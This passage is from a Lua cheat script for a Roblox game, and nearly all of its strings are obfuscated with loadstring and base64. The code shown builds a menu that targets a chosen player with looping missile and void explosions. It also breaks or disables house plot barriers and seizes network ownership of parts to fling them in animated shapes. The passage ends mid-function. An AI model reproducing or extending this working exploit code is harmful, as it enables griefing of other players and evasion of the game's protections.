        username = Value:match(loadstring(base64decode("JShAID8oLispJSk="))()) or Value
        return Players:FindFirstChild(username)
    end

    ExplosionPlayerDropdown = ExplosionConfigBox:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IFRhcmdldA=="))(),
        Items = getPlayerList(),
        Default = nil,
        Callback = function(Value)
            if _expDropUpdate then return end
            _expTarget = getPlayerFromSelection(Value)
        end
    })

    function updateDropdown()
        if ExplosionPlayerDropdown then
            newList = getPlayerList()
            pcall(function()
                ExplosionPlayerDropdown:SetItems(newList, true)
                if not _expTarget and newList[1] then
                    ExplosionPlayerDropdown:SetValue(newList[1])
                end
            end)
        end
    end

    task.spawn(function()
        while task.wait(2) do
            updateDropdown()
        end
    end)

    Players.PlayerAdded:Connect(function()
        task.wait(0.5)
        updateDropdown()
    end)

    Players.PlayerRemoving:Connect(function(plr)
        task.wait(0.5)
        if plr.Name == _expTarget then
            AutoExplosionEnabled = false
            _expTarget = nil
            pcall(function()
                Toggles.AutoExplosionToggle:SetValue(false)
            end)
        end
        updateDropdown()
    end)

    ExplosionConfigBox:CreateButton({
        Name = loadstring(base64decode("UmVmcmVzaCBQbGF5ZXIgTGlzdA=="))(),
        Callback = function()
            updateDropdown()
        end
    })

    ExplosionConfigBox:CreateDropdown({
        Name = loadstring(base64decode("RXhwbG9zaW9uIFR5cGU="))(),
        Items = { loadstring(base64decode("TWlzc2lsZQ=="))(), loadstring(base64decode("RmlyZXdvcms="))(), loadstring(base64decode("Vm9pZA=="))(), loadstring(base64decode("QmFsbG9vbg=="))(), loadstring(base64decode("U21hbGwgUHJlc2VudA=="))(), loadstring(base64decode("QmlnIFByZXNlbnQ="))() },
        Default = loadstring(base64decode("TWlzc2lsZQ=="))(),
        Callback = function(Value)
            typeMap = {
                Missile = loadstring(base64decode("Qm9tYk1pc3NpbGU="))(),
                Firework = loadstring(base64decode("RmlyZXdvcmtNaXNzaWxl"))(),
                Void = loadstring(base64decode("Qm9tYkRhcmtNYXR0ZXI="))(),
                Balloon = loadstring(base64decode("Qm9tYkJhbGxvb24="))(),
                [loadstring(base64decode("U21hbGwgUHJlc2VudA=="))()] = loadstring(base64decode("UHJlc2VudFNtYWxs"))(),
                [loadstring(base64decode("QmlnIFByZXNlbnQ="))()] = loadstring(base64decode("UHJlc2VudEJpZw=="))(),
            }
            ExplosionType = typeMap[Value] or loadstring(base64decode("Qm9tYk1pc3NpbGU="))()
        end
    })

    ExplosionConfigBox:CreateSlider({
        Name = loadstring(base64decode("Qm9tYiBBbW91bnQ="))(),
        Default = 3,
        Min = 1,
        Max = 10,
        Callback = function(v)
            ExplosionAmount = v
        end
    })

    ExplosionConfigBox:CreateToggle({
        Name = loadstring(base64decode("UHJlZGljdCBNb3ZlbWVudA=="))(),
        Default = false,
        Callback = function(v)
            PredictMovement = v
        end
    })

    ExplosionVisualBox:CreateToggle({
        Name = loadstring(base64decode("Q3VzdG9tIEV4cGxvc2lvbiBDb2xvcg=="))(),
        Default = false,
        Callback = function(v)
            ExplosionColorEnabled = v
            RainbowExplosionEnabled = false
            ApplyExplosionColor()
        end
    })

    ExplosionVisualBox:CreateToggle({
        Name = loadstring(base64decode("UmFpbmJvdyBFeHBsb3Npb25z"))(),
        Default = false,
        Callback = function(v)
            RainbowExplosionEnabled = v
            if v then ExplosionColorEnabled = false end
            ApplyExplosionColor()
        end
    })

    ExplosionVisualBox:CreateToggle({
        Name = loadstring(base64decode("SW52ZXJ0IEV4cGxvc2lvbiBDb2xvcg=="))(),
        Default = false,
        Callback = function(v)
            InvertColorEnabled = v
            ApplyExplosionColor()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = loadstring(base64decode("RXhwbG9zaW9uIEJyaWdodG5lc3M="))(),
        Default = 10,
        Min = 10,
        Max = 50,
        Callback = function(v)
            ExplosionBrightness = v
            ApplyExplosionBrightness()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = loadstring(base64decode("UGFydGljbGUgU2l6ZQ=="))(),
        Default = 1,
        Min = 1,
        Max = 10,
        Callback = function(v)
            ParticleSize = v
            ApplyParticleSize()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = loadstring(base64decode("UGFydGljbGUgU3BlZWQ="))(),
        Default = 1,
        Min = 1,
        Max = 10,
        Callback = function(v)
            ParticleSpeed = v
            ApplyParticleSpeed()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = loadstring(base64decode("UGFydGljbGUgTGlmZXRpbWU="))(),
        Default = 1,
        Min = 1,
        Max = 10,
        Callback = function(v)
            ParticleLifetime = v
            ApplyParticleLifetime()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = loadstring(base64decode("UGFydGljbGUgRGVuc2l0eQ=="))(),
        Default = 1,
        Min = 1,
        Max = 10,
        Callback = function(v)
            ParticleDensity = v
            ApplyParticleDensity()
        end
    })

    ExplosionVisualBox:CreateToggle({
        Name = loadstring(base64decode("Q3VzdG9tIFRyYW5zcGFyZW5jeQ=="))(),
        Default = false,
        Callback = function(v)
            TransparentExplosionEnabled = v
            ApplyParticleTransparency()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = loadstring(base64decode("UGFydGljbGUgVHJhbnNwYXJlbmN5"))(),
        Default = 0,
        Min = 0,
        Max = 10,
        Callback = function(v)
            ParticleTransparency = v / 10
            if TransparentExplosionEnabled then
                ApplyParticleTransparency()
            end
        end
    })

    ExplosionVisualBox:CreateDropdown({
        Name = loadstring(base64decode("QmxlbmQgTW9kZQ=="))(),
        Items = { loadstring(base64decode("RGVmYXVsdA=="))(), loadstring(base64decode("QWRkaXRpdmU="))() },
        Default = loadstring(base64decode("RGVmYXVsdA=="))(),
        Callback = function(v)
            BlendMode = v
            ApplyBlendMode()
        end
    })

    AutoExplosionBox:CreateToggle({
    Name = loadstring(base64decode("TG9vcCBFeHBsb2Rl"))(),
    Default = false,
    Callback = function(v)
        AutoExplosionEnabled = v
        if v then
            if not _expTarget or _expTarget == loadstring(base64decode(""))() then
                AutoExplosionEnabled = false
                Library:Notify({ Title = loadstring(base64decode("RXJyb3I="))(), Content = loadstring(base64decode("U2VsZWN0IHRhcmdldCBmaXJzdCE="))(), Duration = 3 })
                return
            end
            -- ใช้ task.spawn เพื่อไม่ให้ UI ค้าง
            task.spawn(AutoExplosionLoop)
        else
            task.wait(0.3)
            DeleteAllBombs()
        end
    end
})
end

do

    local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
    local LocalPlayer = Players.LocalPlayer
    local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
    local Workspace = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())

    local destroyBarrierActive = false
    local destroyBarrierThread = nil
    local plotsBroken = false


    BarrierGroup:CreateButton({
        Name = loadstring(base64decode("QnJlYWsgSG91c2UgQmFycmllcnMgKEJlc3Qp"))(),
        Callback = function()
            breakhouse(loadstring(base64decode("YXV0bw=="))())
        end
    })

    BarrierGroup:CreateToggle({
        Name = loadstring(base64decode("QW50aSBCYXJyaWVy"))(),
        Default = false,
        Callback = function(val)
            local plots = workspace:FindFirstChild(loadstring(base64decode("UGxvdHM="))())
            if not plots then return end
            for _, plot in ipairs(plots:GetChildren()) do
                local barrierModel = plot:FindFirstChild(loadstring(base64decode("QmFycmllcg=="))())
                if barrierModel then
                    for _, part in ipairs(barrierModel:GetChildren()) do
                        if part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and part.Name == loadstring(base64decode("UGxvdEJhcnJpZXI="))() then
                            part.CanCollide = not val
                        end
                    end
                end
            end
        end
    })
end

do

    activeSparklers = {}
    sparklerConfig = {
        Height = 5,
        Speed = 2,
        Radius = 15,
        CurrentShape = 'Planet',
    }

    shapeOptions = {
        'Planet',
        'Sphere',
        'Cylinder',
        'Double Ring',
        'Star',
        'Infinity',
        'Heart',
        'DNA Helix',
        'Triple Helix',
        'Tornado',
        'Galaxy Spiral',
        'Fibonacci Spiral',
        'Spring Coil',
        'Vortex Funnel',
        'Box',
        'Rounded Cube',
        'Torus',
        'Torus Knot',
        'Möbius Strip',
        'Saturn',
        'Ice Cube',
    }

    function SetupPhysics(obj, list)
        for _, v in ipairs(list) do
            if v == obj then
                return
            end
        end

        mainPart = obj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and obj or obj.PrimaryPart or obj:FindFirstChildWhichIsA(loadstring(base64decode("QmFzZVBhcnQ="))(), true)
        if not mainPart then
            return
        end

        pcall(function()
            if mainPart:CanSetNetworkOwnership() then
                mainPart:SetNetworkOwner(LocalPlayer)
            end
        end)

        mainPart.Anchored = false

        bp = mainPart:FindFirstChild(loadstring(base64decode("VG95Qm9keVBvcw=="))()) or Instance.new(loadstring(base64decode("Qm9keVBvc2l0aW9u"))(), mainPart)
        bp.Name = loadstring(base64decode("VG95Qm9keVBvcw=="))()
        bp.MaxForce = Vector3.new(1e8, 1e8, 1e8)
        bp.P = 100000
        bp.D = 800

        bg = mainPart:FindFirstChild(loadstring(base64decode("VG95Qm9keUd5cm8="))()) or Instance.new(loadstring(base64decode("Qm9keUd5cm8="))(), mainPart)
        bg.Name = loadstring(base64decode("VG95Qm9keUd5cm8="))()
        bg.MaxTorque = Vector3.new(1e8, 1e8, 1e8)
        bg.P = 50000

        for _, p in ipairs(obj:GetDescendants()) do
            if p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                p.CanCollide = false
            end
        end

        table.insert(list, obj)
    end

    TAU = math.pi * 2
    sqrt = math.sqrt
    sin = math.sin
    cos = math.cos
    abs = math.abs
    pow = function(b, e)
        return b >= 0 and b ^ e or -((-b) ^ e)
    end
    clamp = math.clamp

    function baseAngle(xVec0uwV, n, t, speed)
        return (xVec0uwV / n) * TAU + t * speed
    end

    Shapes = {}
    Shapes.Planet = function(xVec0uwV, n, t, r, h, sp)
        coreN = clamp(math.floor(n * 0.35), 8, 15)
        coreN = math.min(coreN, n)
        ring1N = math.max(math.floor((n - coreN) / 2), 1)
        spin = t * sp

        if xVec0uwV <= coreN then
            phi = math.acos(1 - 2 * (xVec0uwV / coreN))
            theta = xVec0uwV * math.pi * (3 - sqrt(5)) + spin
            cr = r * 0.35
            return Vector3.new(cos(theta) * sin(phi) * cr, cos(phi) * cr + h, sin(theta) * sin(phi) * cr)
        elseif xVec0uwV <= coreN + ring1N then
            idx = xVec0uwV - coreN
            a = (idx / ring1N) * TAU + spin
            rr = r * 0.9
            tilt = math.rad(30)
            return Vector3.new(cos(a) * rr, sin(a) * rr * sin(tilt) + h, sin(a) * rr * cos(tilt))
        else
            idx = xVec0uwV - (coreN + ring1N)
            c = math.max(n - (coreN + ring1N), 1)
            a = (idx / c) * TAU + t * sp * 0.5
            rr = r * 1.3
            tilt = math.rad(-40)
            return Vector3.new(cos(a) * rr, sin(a) * rr * sin(tilt) + h, sin(a) * rr * cos(tilt))
        end
    end

    Shapes.Sphere = function(xVec0uwV, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (xVec0uwV / n))
        theta = xVec0uwV * math.pi * (3 - sqrt(5)) + t * sp * 2
        return Vector3.new(cos(theta) * sin(phi) * r, cos(phi) * r + h, sin(theta) * sin(phi) * r)
    end

    Shapes.Cylinder = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
        y = (xVec0uwV / n) * r * 1.5 - r * 0.75
        return Vector3.new(cos(a) * r, h + y, sin(a) * r)
    end

    Shapes[loadstring(base64decode("RG91YmxlIFJpbmc="))()] = function(xVec0uwV, n, t, r, h, sp)
        a = (xVec0uwV / (n / 2)) * TAU + t * sp
        if xVec0uwV % 2 == 0 then
            return Vector3.new(cos(a) * r, h, sin(a) * r)
        else
            return Vector3.new(0, h + cos(a) * r, sin(a) * r)
        end
    end

    Shapes.Star = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
        rr = (xVec0uwV % 2 == 0) and r or r * 0.38
        return Vector3.new(cos(a) * rr, h + sin(t * sp * 1.5 + xVec0uwV * 0.3) * 1.5, sin(a) * rr)
    end

    Shapes.Infinity = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
        d = 1 + sin(a) ^ 2
        return Vector3.new((r * cos(a)) / d, h + sin(t * sp + xVec0uwV * 0.2) * 1.2, (r * sin(a) * cos(a)) / d)
    end

    Shapes.Heart = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
        pulse = 1 + 0.12 * sin(t * sp * 2)
        scale = (r / 15) * pulse
        x = 16 * sin(a) ^ 3
        z = -(13 * cos(a) - 5 * cos(2 * a) - 2 * cos(3 * a) - cos(4 * a))
        return Vector3.new(x * scale, h + sin(t * sp * 2) * 0.5, z * scale)
    end

    Shapes[loadstring(base64decode("RE5BIEhlbGl4"))()] = function(xVec0uwV, n, t, r, h, sp)
        y = (xVec0uwV / n) * r * 2 - r
        a = baseAngle(xVec0uwV, n, t, sp) + y * 0.5
        side = (xVec0uwV % 2 == 0) and 1 or -1
        return Vector3.new(cos(a) * r * side, h + y, sin(a) * r * side)
    end

    Shapes[loadstring(base64decode("VHJpcGxlIEhlbGl4"))()] = function(xVec0uwV, n, t, r, h, sp)
        y = (xVec0uwV / n) * r * 2 - r
        a = baseAngle(xVec0uwV, n, t, sp) + y * 0.5
        phase = (xVec0uwV % 3) * (TAU / 3)
        return Vector3.new(cos(a + phase) * r, h + y, sin(a + phase) * r)
    end

    Shapes.Tornado = function(xVec0uwV, n, t, r, h, sp)
        y = (xVec0uwV / n) * r * 2 - r
        rr = ((y + r) / (r * 2)) * r + 2
        a = baseAngle(xVec0uwV, n, t, sp) + y * 0.5
        return Vector3.new(cos(a) * rr, h + y, sin(a) * rr)
    end

    Shapes[loadstring(base64decode("R2FsYXh5IFNwaXJhbA=="))()] = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        a = frac * 12 + t * sp
        return Vector3.new(cos(a) * r * (frac ^ 1.5), h + sin(t * sp * 2 + frac * 10), sin(a) * r * (frac ^ 1.5))
    end

    Shapes[loadstring(base64decode("Rmlib25hY2NpIFNwaXJhbA=="))()] = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        angle = frac * TAU * 6.18 + t * sp
        dist = frac * r
        wave = sin(t * sp + frac * TAU) * 2
        return Vector3.new(cos(angle) * dist, h + wave, sin(angle) * dist)
    end

    Shapes[loadstring(base64decode("U3ByaW5nIENvaWw="))()] = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        a = frac * TAU * 5 + t * sp
        y = frac * r * 2 - r
        return Vector3.new(cos(a) * r * 0.5, h + y, sin(a) * r * 0.5)
    end

    Shapes[loadstring(base64decode("Vm9ydGV4IEZ1bm5lbA=="))()] = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        a = frac * TAU * 4 + t * sp
        rr = frac * r
        y = (1 - frac) * r * 1.5
        return Vector3.new(cos(a) * rr, h + y, sin(a) * rr)
    end

    Shapes.Seashell = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        u = frac * TAU * 3 + t * sp
        v = frac * TAU
        growth = math.exp(0.15 * u)
        x = growth * cos(u) * (1 + cos(v)) * r * 0.15
        y = growth * sin(u) * (1 + cos(v)) * r * 0.15
        z = growth * sin(v) * r * 0.15
        return Vector3.new(x, h + y, z)
    end

    Shapes.Box = function(xVec0uwV, n, t, r, h, sp)
        face = xVec0uwV % 6
        a = baseAngle(xVec0uwV, n, t, sp)
        wb = sin(t * sp + xVec0uwV) * 0.3
        s = r
        edges = {
            Vector3.new(s, sin(a) * s, cos(a) * s),
            Vector3.new(-s, sin(a) * s, cos(a) * s),
            Vector3.new(sin(a) * s, s, cos(a) * s),
            Vector3.new(sin(a) * s, -s, cos(a) * s),
            Vector3.new(sin(a) * s, cos(a) * s, s),
            Vector3.new(sin(a) * s, cos(a) * s, -s),
        }
        v = edges[face + 1]
        return Vector3.new(v.X, v.Y + h + wb, v.Z)
    end

    Shapes[loadstring(base64decode("Um91bmRlZCBDdWJl"))()] = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
        x = pow(cos(a) * r, 0.85)
        y = pow(sin(a * 1.3) * r * 0.6, 0.85)
        z = pow(cos(a * 0.7) * r, 0.85)
        return Vector3.new(x, y + h, z)
    end

    Shapes.Torus = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
        b = baseAngle(xVec0uwV, n, t * 3, sp)
        R = r
        rt = r * 0.35
        return Vector3.new((R + rt * cos(b)) * cos(a), rt * sin(b) + h, (R + rt * cos(b)) * sin(a))
    end

    Shapes[loadstring(base64decode("VG9ydXMgS25vdA=="))()] = function(xVec0uwV, n, t, r, h, sp)
        p, q = 2, 3
        a = baseAngle(xVec0uwV, n, t, sp)
        phi = a * q
        R = r * (1 + 0.35 * cos(p * a))
        return Vector3.new(R * cos(phi), r * 0.35 * sin(p * a) + h, R * sin(phi))
    end

    Shapes[loadstring(base64decode("TcO2Yml1cyBTdHJpcA=="))()] = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        u = frac * TAU + t * sp
        v = (xVec0uwV % 2 == 0) and 0.5 or -0.5
        w = r * 0.35
        return Vector3.new((r + w * v * cos(u / 2)) * cos(u), w * v * sin(u / 2) + h, (r + w * v * cos(u / 2)) * sin(u))
    end

    Shapes.Saturn = function(xVec0uwV, n, t, r, h, sp)
        spin = t * sp
        if xVec0uwV <= n * 0.6 then
            phi = math.acos(1 - 2 * (xVec0uwV / (n * 0.6)))
            theta = xVec0uwV * math.pi * (3 - sqrt(5)) + spin
            pr = r * 0.45
            return Vector3.new(cos(theta) * sin(phi) * pr, cos(phi) * pr + h, sin(theta) * sin(phi) * pr)
        else
            idx = xVec0uwV - n * 0.6
            c = n - n * 0.6
            a = (idx / c) * TAU + spin
            rr = r * 1.2
            return Vector3.new(cos(a) * rr, sin(a) * rr * sin(math.rad(25)) + h, sin(a) * rr * cos(math.rad(25)))
        end
    end

    Shapes[loadstring(base64decode("SWNlIEN1YmU="))()] = function(xVec0uwV, n, t, r, h, sp)
        face = xVec0uwV % 6
        frac = (xVec0uwV % math.max(math.floor(n / 6), 1)) / math.max(math.floor(n / 6), 1)
        a = frac * TAU
        s = r * 0.8
        crack = sin(t * sp * 2 + xVec0uwV * 0.5) * 0.4
        pts = {
            Vector3.new(s + crack, cos(a) * s, sin(a) * s),
            Vector3.new(-s - crack, cos(a) * s, sin(a) * s),
            Vector3.new(cos(a) * s, s + crack, sin(a) * s),
            Vector3.new(cos(a) * s, -s - crack, sin(a) * s),
            Vector3.new(cos(a) * s, sin(a) * s, s + crack),
            Vector3.new(cos(a) * s, sin(a) * s, -s - crack),
        }
        v = pts[face + 1]
        return Vector3.new(v.X, v.Y + h, v.Z)
    end

    Shapes[loadstring(base64decode("QmxhY2sgSG9sZQ=="))()] = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        a = frac * TAU * 3 + t * sp
        dist = r * (1 - frac * 0.7)
        suck = sin(t * sp * 2) * 0.5
        return Vector3.new(cos(a) * dist, h + suck * frac * 3, sin(a) * dist)
    end

    Shapes[loadstring(base64decode("SHlwZXIgU3BoZXJl"))()] = function(xVec0uwV, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (xVec0uwV / n))
        theta = xVec0uwV * math.pi * (3 - sqrt(5)) + t * sp
        pulse = r + sin(t * sp + xVec0uwV * 0.3) * r * 0.25
        return Vector3.new(cos(theta) * sin(phi) * pulse, cos(phi) * pulse + h, sin(theta) * sin(phi) * pulse)
    end

    Shapes[loadstring(base64decode("T3JiaXRhbCBSaW5ncw=="))()] = function(xVec0uwV, n, t, r, h, sp)
        ring = xVec0uwV % 3
        a = baseAngle(xVec0uwV, n, t, sp)
        tilts = { math.rad(0), math.rad(60), math.rad(-60) }
        tilt = tilts[ring + 1]
        return Vector3.new(cos(a) * r, sin(a) * r * sin(tilt) + h, sin(a) * r * cos(tilt))
    end

    Shapes[loadstring(base64decode("TGlnaHRuaW5nIFRvcm5hZG8="))()] = function(xVec0uwV, n, t, r, h, sp)
        y = (xVec0uwV / n) * r * 2 - r
        rr = ((y + r) / (r * 2)) * r + 2
        bolt = sin(xVec0uwV * 7.3 + t * sp * 5) * 3
        a = baseAngle(xVec0uwV, n, t, sp) + y * 0.5
        return Vector3.new(cos(a) * rr + bolt, h + y, sin(a) * rr + bolt)
    end

    Shapes[loadstring(base64decode("UGxhc21hIENhZ2U="))()] = function(xVec0uwV, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (xVec0uwV / n))
        theta = xVec0uwV * math.pi * (3 - sqrt(5))
        arc = sin(t * sp * 2 + phi * 6) * r * 0.2
        rr = r + arc
        return Vector3.new(cos(theta) * sin(phi) * rr, cos(phi) * rr + h, sin(theta) * sin(phi) * rr)
    end

    Shapes.Wormhole = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        a = frac * TAU + t * sp
        y = (frac - 0.5) * r * 3
        neck = r * (1 - math.exp(-((y / (r * 0.8)) ^ 2))) + 0.5
        return Vector3.new(cos(a) * neck, h + y, sin(a) * neck)
    end

    Shapes[loadstring(base64decode("UXVhbnR1bSBMYXR0aWNl"))()] = function(xVec0uwV, n, t, r, h, sp)
        grid = math.ceil(n ^ (0.3333333333333333))
        gx = xVec0uwV % grid
        gy = math.floor(xVec0uwV / grid) % grid
        gz = math.floor(xVec0uwV / (grid * grid)) % grid
        scale = r * 2 / grid
        jitter = sin(t * sp + xVec0uwV * 1.7) * 0.3
        return Vector3.new((gx - grid / 2) * scale + jitter, (gy - grid / 2) * scale + h, (gz - grid / 2) * scale + jitter)
    end

    Shapes[loadstring(base64decode("TmV1dHJvbiBCdXJzdA=="))()] = function(xVec0uwV, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (xVec0uwV / n))
        theta = xVec0uwV * math.pi * (3 - sqrt(5))
        burst = r * abs(sin(t * sp + xVec0uwV * 0.4))
        return Vector3.new(cos(theta) * sin(phi) * burst, cos(phi) * burst + h, sin(theta) * sin(phi) * burst)
    end

    Shapes[loadstring(base64decode("QXJjIERpc2NoYXJnZQ=="))()] = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        a = frac * TAU
        arc = sin(frac * math.pi) * r
        zap = sin(t * sp * 8 + xVec0uwV * 2.1) * r * 0.15
        return Vector3.new(cos(a) * r + zap, h + arc + zap, sin(a) * r + zap)
    end

    Shapes[loadstring(base64decode("RXZlbnQgSG9yaXpvbg=="))()] = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        a = frac * TAU * 5 + t * sp
        dist = r * (0.2 + 0.8 * abs(sin(frac * math.pi)))
        warp = sin(t * sp * 3 + frac * TAU) * r * 0.1
        return Vector3.new(cos(a) * dist, h + warp, sin(a) * dist)
    end

    Shapes.Butterfly = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp * 0.5)
        ex = math.exp(cos(a)) - 2 * cos(4 * a) - sin(a / 12) ^ 5
        rr = ex * r * 0.4
        return Vector3.new(cos(a) * rr, h + sin(t * sp + xVec0uwV * 0.1) * 1.5, sin(a) * rr)
    end

    Shapes[loadstring(base64decode("Um9zZSBQZXRhbA=="))()] = function(xVec0uwV, n, t, r, h, sp)
        sckTj49T = 5
        a = baseAngle(xVec0uwV, n, t, sp * 0.3)
        rr = r * cos(sckTj49T * a)
        return Vector3.new(cos(a) * rr, h + sin(t * sp + xVec0uwV * 0.2) * 2, sin(a) * rr)
    end

    Shapes.Snowflake = function(xVec0uwV, n, t, r, h, sp)
        arm = xVec0uwV % 6
        frac = (xVec0uwV % math.max(math.floor(n / 6), 1)) / math.max(math.floor(n / 6), 1)
        baseA = arm * (TAU / 6) + t * sp * 0.2
        dist = frac * r
        branch = sin(frac * math.pi * 4) * r * 0.2
        return Vector3.new(cos(baseA) * dist + cos(baseA + math.pi / 2) * branch, h + cos(t * sp) * 0.5, sin(baseA) * dist + sin(baseA + math.pi / 2) * branch)
    end

    Shapes[loadstring(base64decode("Q3J5c3RhbCBCbG9vbQ=="))()] = function(xVec0uwV, n, t, r, h, sp)
        petals = 8
        arm = xVec0uwV % petals
        frac = (xVec0uwV % math.max(math.floor(n / petals), 1)) / math.max(math.floor(n / petals), 1)
        baseA = arm * (TAU / petals) + t * sp * 0.3
        dist = frac * r
        lift = sin(frac * math.pi) * r * 0.5
        return Vector3.new(cos(baseA) * dist, h + lift, sin(baseA) * dist)
    end

    Shapes[loadstring(base64decode("VmluZSBXcmFw"))()] = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        turns = 4
        a = frac * TAU * turns + t * sp
        y = frac * r * 2 - r
        bulge = 1 + 0.3 * sin(frac * TAU * turns * 2)
        rr = r * 0.5 * bulge
        return Vector3.new(cos(a) * rr, h + y, sin(a) * rr)
    end

    Shapes[loadstring(base64decode("Rmxvd2VyIEJsb29t"))()] = function(xVec0uwV, n, t, r, h, sp)
        petals = 6
        a = baseAngle(xVec0uwV, n, t, sp * 0.4)
        rr = r * abs(cos(petals * a * 0.5))
        bloom = 1 + 0.2 * sin(t * sp * 2)
        return Vector3.new(cos(a) * rr * bloom, h + sin(t * sp + a) * 1.5, sin(a) * rr * bloom)
    end

    Shapes.Jellyfish = function(xVec0uwV, n, t, r, h, sp)
        bell = math.floor(n * 0.4)
        if xVec0uwV <= bell then
            phi = (xVec0uwV / bell) * math.pi * 0.5
            theta = baseAngle(xVec0uwV, bell, t, sp)
            pulse = r * (1 + 0.2 * sin(t * sp * 3))
            return Vector3.new(cos(theta) * sin(phi) * pulse, cos(phi) * pulse * 0.5 + h, sin(theta) * sin(phi) * pulse)
        else
            idx = xVec0uwV - bell
            c = n - bell
            a = (idx / c) * TAU + t * sp
            drop = (idx / c) * r * 1.5
            wave = sin(t * sp * 4 + a * 3) * r * 0.15
            return Vector3.new(cos(a) * r * 0.2 + wave, h - drop, sin(a) * r * 0.2 + wave)
        end
    end

    Shapes[loadstring(base64decode("Q29yYWwgUmVlZg=="))()] = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp * 0.2)
        frac = xVec0uwV / n
        y = sin(frac * TAU * 3 + t * sp) * r * 0.8
        rr = r * (0.5 + 0.5 * sin(frac * TAU * 5))
        sway = sin(t * sp + frac * 12) * r * 0.1
        return Vector3.new(cos(a) * rr + sway, h + y, sin(a) * rr + sway)
    end

    Shapes[loadstring(base64decode("Vm9sY2FubyBCdXJzdA=="))()] = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
        burst = abs(sin(t * sp + xVec0uwV)) * r * 2
        return Vector3.new(cos(a) * burst, h + burst, sin(a) * burst)
    end

    Shapes[loadstring(base64decode("Q29zbWljIEV4cGxvc2lvbg=="))()] = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
        wave = abs(sin(t * sp * 2 - xVec0uwV * 0.1))
        return Vector3.new(cos(a) * r * wave * 3, h + wave * 5, sin(a) * r * wave * 3)
    end

    Shapes.Supernova = function(xVec0uwV, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (xVec0uwV / n))
        theta = xVec0uwV * math.pi * (3 - sqrt(5)) + t * sp
        blast = r * (1 + sin(t * sp * 0.5) * 0.5)
        eject = sin(phi * 3 + t * sp * 4) * r * 0.3
        return Vector3.new(cos(theta) * sin(phi) * (blast + eject), cos(phi) * (blast + eject) + h, sin(theta) * sin(phi) * (blast + eject))
    end

    Shapes[loadstring(base64decode("RmlyZXdvcmsgUG9w"))()] = function(xVec0uwV, n, t, r, h, sp)
        phi = math.acos(1 - 2 * (xVec0uwV / n))
        theta = xVec0uwV * math.pi * (3 - sqrt(5))
        trail = abs(sin(t * sp * 3 + xVec0uwV * 0.7))
        rr = r * trail
        sparkle = sin(t * sp * 10 + xVec0uwV) * 0.8
        return Vector3.new(cos(theta) * sin(phi) * rr, cos(phi) * rr + h + sparkle, sin(theta) * sin(phi) * rr)
    end

    Shapes.Shockwave = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
        ring = sin(t * sp * 3) * r
        y = cos(t * sp * 2 + xVec0uwV * 0.2) * r * 0.3
        return Vector3.new(cos(a) * ring, h + y, sin(a) * ring)
    end

    Shapes.Lissajous = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
        p, q = 3, 2
        d = math.pi / 2
        return Vector3.new(r * sin(p * a + d), h + r * 0.4 * sin(t * sp + xVec0uwV * 0.1), r * sin(q * a))
    end

    Shapes.Hypotrochoid = function(xVec0uwV, n, t, r, h, sp)
        R, rd, d = r, r * 0.4, r * 0.7
        a = baseAngle(xVec0uwV, n, t, sp)
        x = (R - rd) * cos(a) + d * cos((R - rd) / rd * a)
        z = (R - rd) * sin(a) - d * sin((R - rd) / rd * a)
        return Vector3.new(x * 0.7, h + sin(t * sp + xVec0uwV * 0.2) * 2, z * 0.7)
    end

    Shapes.Epitrochoid = function(xVec0uwV, n, t, r, h, sp)
        R, rd, d = r * 0.6, r * 0.35, r * 0.5
        a = baseAngle(xVec0uwV, n, t, sp)
        x = (R + rd) * cos(a) - d * cos((R + rd) / rd * a)
        z = (R + rd) * sin(a) - d * sin((R + rd) / rd * a)
        return Vector3.new(x * 0.7, h + sin(t * sp + xVec0uwV * 0.15) * 2, z * 0.7)
    end

    Shapes.Trefoil = function(xVec0uwV, n, t, r, h, sp)
        a = baseAngle(xVec0uwV, n, t, sp)
